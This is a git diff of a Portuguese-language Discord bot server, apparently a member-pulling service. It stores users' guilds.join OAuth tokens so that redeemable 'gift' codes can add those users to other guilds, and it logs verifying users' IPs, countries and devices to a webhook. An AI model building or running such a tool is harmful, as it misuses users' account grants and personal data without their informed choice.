@@ -4,9 +4,6 @@ const axios = require('axios');
 const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 const { renderGiftPage } = require('./giftPage');
 
-// ============================
-// PROTEÇÃO GLOBAL CONTRA CRASH
-// ============================
 process.on('unhandledRejection', (err) => {
     console.error('⚠️ [UNHANDLED REJECTION]', err && err.message ? err.message : err);
 });
@@ -45,10 +42,7 @@ module.exports = (app, client) => {
     }
 
     function paginaManutencao() {
-        return '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Em manutenção</title><link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PlxxStore/meubot/main/favicon.png"><style>' +
-        '*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0a0a0c;color:#d4d4d8;min-height:100vh;padding:60px 20px;display:flex;justify-content:center;align-items:center}body::before{content:"";position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,0.012) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.012) 1px,transparent 1px);background-size:80px 80px;pointer-events:none}' +
-        '.wrap{max-width:520px;width:100%;position:relative}.handwritten{font-family:"Brush Script MT","Segoe Script",cursive;color:#fbbf24;font-size:26px;font-style:italic;transform:rotate(-3deg);display:inline-block;margin-bottom:24px}.wrench{width:88px;height:88px;background:linear-gradient(135deg,#fbbf24,#f59e0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:28px;font-size:40px}h1{font-size:42px;font-weight:700;color:#f4f4f5;letter-spacing:-1.5px;line-height:1.1;margin-bottom:16px}.sub{font-size:15px;color:#71717a;line-height:1.6;margin-bottom:32px}.info{background:#0d0d10;border:1px solid #1a1a1e;border-radius:10px;padding:4px 20px;margin-bottom:32px}.row{display:flex;justify-content:space-between;padding:14px 0;font-size:13.5px;border-bottom:1px solid #1a1a1e}.row:last-child{border-bottom:none}.row span:first-child{color:#71717a}.row span:last-child{color:#e4e4e7;font-weight:500}.status-on{color:#fbbf24!important}.btn{display:flex;align-items:center;justify-content:center;padding:15px;background:#f4f4f5;color:#0a0a0c;border-radius:10px;font-size:14px;font-weight:600;text-decoration:none}' +
-        '</style></head><body><div class="wrap"><div class="handwritten">manutenção ↗</div><div class="wrench">🔧</div><h1>Sistema em<br>manutenção</h1><p class="sub">Estamos fazendo melhorias. Voltamos em breve.</p><div class="info"><div class="row"><span>Status</span><span class="status-on">Em manutenção</span></div><div class="row"><span>Previsão</span><span>Em breve</span></div></div><a class="btn" href="/">← Voltar</a></div></body></html>';
+        return '<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Em manutenção</title><link rel="icon" type="image/png" href="https://raw.githubusercontent.com/PlxxStore/meubot/main/favicon.png"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#0a0a0c;color:#d4d4d8;min-height:100vh;padding:60px 20px;display:flex;justify-content:center;align-items:center}.wrap{max-width:520px;width:100%}.handwritten{font-family:"Brush Script MT",cursive;color:#fbbf24;font-size:26px;font-style:italic;display:inline-block;margin-bottom:24px}.wrench{width:88px;height:88px;background:linear-gradient(135deg,#fbbf24,#f59e0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:28px;font-size:40px}h1{font-size:42px;font-weight:700;color:#f4f4f5;line-height:1.1;margin-bottom:16px}.sub{font-size:15px;color:#71717a;margin-bottom:32px}.info{background:#0d0d10;border:1px solid #1a1a1e;border-radius:10px;padding:4px 20px;margin-bottom:32px}.row{display:flex;justify-content:space-between;padding:14px 0;font-size:13.5px;border-bottom:1px solid #1a1a1e}.row:last-child{border-bottom:none}.row span:first-child{color:#71717a}.row span:last-child{color:#e4e4e7;font-weight:500}.status-on{color:#fbbf24!important}.btn{display:flex;align-items:center;justify-content:center;padding:15px;background:#f4f4f5;color:#0a0a0c;border-radius:10px;font-size:14px;font-weight:600;text-decoration:none}</style></head><body><div class="wrap"><div class="handwritten">manutenção ↗</div><div class="wrench">🔧</div><h1>Sistema em<br>manutenção</h1><p class="sub">Estamos fazendo melhorias. Voltamos em breve.</p><div class="info"><div class="row"><span>Status</span><span class="status-on">Em manutenção</span></div><div class="row"><span>Previsão</span><span>Em breve</span></div></div><a class="btn" href="/">← Voltar</a></div></body></html>';
     }
 
     async function checkManutencao(req, res, next) {
@@ -72,8 +66,7 @@ module.exports = (app, client) => {
     app.get('/invite', (req, res) => {
         const clientId = process.env.CLIENT_ID;
         const perms = '8';
-        const url = 'https://discord.com/oauth2/authorize?client_id=' + clientId + '&permissions=' + perms + '&scope=bot%20applications.commands';
-        res.redirect(url);
+        res.redirect('https://discord.com/oauth2/authorize?client_id=' + clientId + '&permissions=' + perms + '&scope=bot%20applications.commands');
     });
 
     try {
@@ -150,12 +143,7 @@ module.exports = (app, client) => {
                 toPull = filtrados.slice(0, gift.quantidade);
             }
 
-            gift.status = 'esgotado';
-            gift.servidorUsado = guildId;
-            gift.usados = gift.quantidade;
-            gift.esgotadoEm = Date.now();
-            gift.puxados = 0;
-            gift.falhas = 0;
+            gift.status = 'esgotado'; gift.servidorUsado = guildId; gift.usados = gift.quantidade; gift.esgotadoEm = Date.now(); gift.puxados = 0; gift.falhas = 0;
             gifts[codigo] = gift;
             await config.set('gifts', gifts);
             await config.set('giftLogs_' + codigo, []);
@@ -173,7 +161,7 @@ module.exports = (app, client) => {
     });
 
     // ============================
-    // CALLBACK OAuth2 (COM offline_access + prompt=consent)
+    // CALLBACK OAuth2
     // ============================
     app.get('/oauth2/callback', async (req, res) => {
         const code = req.query.code;
@@ -186,8 +174,8 @@ module.exports = (app, client) => {
             params.append('grant_type', 'authorization_code');
             params.append('code', code);
             params.append('redirect_uri', process.env.REDIRECT_URI);
-            // ✅ offline_access pra retornar refresh_token
-            params.append('scope', 'identify email guilds.join offline_access');
+            // ⚠️ SEM offline_access (não existe no Discord). O prompt=consent já cuida do refresh_token
+            params.append('scope', 'identify email guilds.join');
 
             const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', params, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
             const access_token = tokenResponse.data.access_token;
@@ -274,15 +262,12 @@ module.exports = (app, client) => {
     });
 
     app.get('/error', (req, res) => {
-        try { res.render('error.html', { error: req.query.msg || 'Unknown error' }); } catch (e) { res.status(200).send('Erro: ' + (req.query.msg || 'desconhecido')); }
+        try { res.render('error.html', { error: req.query.msg || 'Unknown error' }); } catch (e) { res.status(200).send('Erro'); }
     });
 
     console.log('✅ [server.js] todas as rotas foram registradas');
 };
 
-// ============================
-// LOG DE VERIFICAÇÃO
-// ============================
 async function sendLog(client, userData, ip, userDevice, geo, config, status) {
     try {
         let logChannelId = process.env.LOG_CHANNEL_ID;
@@ -313,16 +298,12 @@ async function sendLog(client, userData, ip, userDevice, geo, config, status) {
                 { name: '🌎 País', value: '`' + geo.pais + '`', inline: true },
                 { name: '🌐 IP', value: '`' + ip + '`' },
                 { name: '📱 Dispositivo', value: '`' + userDevice.substring(0, 1020) + '`' }
-            )
-            .setTimestamp();
+            ).setTimestamp();
         if (status.motivoFalha) embed.addFields({ name: '⚠️ Motivo da Falha', value: '`' + status.motivoFalha.substring(0, 1020) + '`' });
         await webhook.send({ embeds: [embed] });
     } catch (err) { console.error('❌ [sendLog] erro:', err.message); }
 }
 
-// ============================
-// LOG DE GIFT
-// ============================
 async function enviarLogGift(client, config, tipo, dados) {
     try {
         const logChannelId = await config.get('giftLogChannelId');
@@ -331,19 +312,14 @@ async function enviarLogGift(client, config, tipo, dados) {
         if (!channel) return;
         let embed;
         if (tipo === 'usado') {
-            embed = new EmbedBuilder().setColor(0xFEE75C).setTitle('🎁 Gift Usado')
-                .addFields({ name: 'Código', value: '`' + dados.codigo + '`', inline: true }, { name: 'Quantidade', value: '`' + dados.quantidade + ' membros`', inline: true }, { name: 'Servidor', value: dados.guildName, inline: false }).setTimestamp();
+            embed = new EmbedBuilder().setColor(0xFEE75C).setTitle('🎁 Gift Usado').addFields({ name: 'Código', value: '`' + dados.codigo + '`', inline: true }, { name: 'Quantidade', value: '`' + dados.quantidade + ' membros`', inline: true }, { name: 'Servidor', value: dados.guildName, inline: false }).setTimestamp();
         } else if (tipo === 'deletado') {
-            embed = new EmbedBuilder().setColor(0xED4245).setTitle('🗑️ Gift Deletado')
-                .addFields({ name: 'Código', value: '`' + dados.codigo + '`', inline: true }).setTimestamp();
+            embed = new EmbedBuilder().setColor(0xED4245).setTitle('🗑️ Gift Deletado').addFields({ name: 'Código', value: '`' + dados.codigo + '`', inline: true }).setTimestamp();
         }
         if (embed) await channel.send({ embeds: [embed] });
     } catch (err) { console.error('❌ [giftLog] erro:', err.message); }
 }
 
-// ============================
-// PUXAR MEMBROS DO GIFT
-// ============================
 async function puxarMembrosGift(client, config, codigo, guildId, userList, guild) {
     try {
         const { users } = require('../database');
@@ -401,9 +377,9 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
                     } catch (e) {}
                 }
 
-                if (resp.status === 201 || resp.status === 204) { puxados++; await addLog('Puxado: ' + (userData.username || userId)); }
-                else { falhas++; await addLog('Falha: ' + (userData.username || userId), 'erro'); }
-            } catch (err) { falhas++; await addLog('Erro: ' + (userData.username || userId), 'erro'); }
+                if (resp.status === 201 || resp.status === 204) { puxados++; await addLog('Membro ' + (userData.username || userId) + ' puxado com sucesso'); }
+                else { falhas++; await addLog('Falha ao puxar ' + (userData.username || userId) + ' (status ' + resp.status + ')', 'erro'); }
+            } catch (err) { falhas++; await addLog('Erro ao puxar ' + (userData.username || userId), 'erro'); }
             processed++;
             await new Promise(function(r) { setTimeout(r, 600); });
         }
@@ -413,7 +389,7 @@ async function puxarMembrosGift(client, config, codigo, guildId, userList, guild
             const gifts = (await config.get('gifts')) || {};
             if (gifts[codigo]) { gifts[codigo].puxados = puxados; gifts[codigo].falhas = falhas; await config.set('gifts', gifts); }
         } catch (err) {}
-        await addLog('Finalizado. ' + puxados + ' puxados, ' + falhas + ' falhas.', 'sucesso');
+        await addLog('Finalizado. Total de ' + puxados + ' membros puxados.', 'sucesso');
         console.log('✅ [GIFT ' + codigo + '] ' + puxados + ' puxados, ' + falhas + ' falhas');
     } catch (err) { console.error('❌ [puxarMembrosGift] erro:', err.message); }
 }
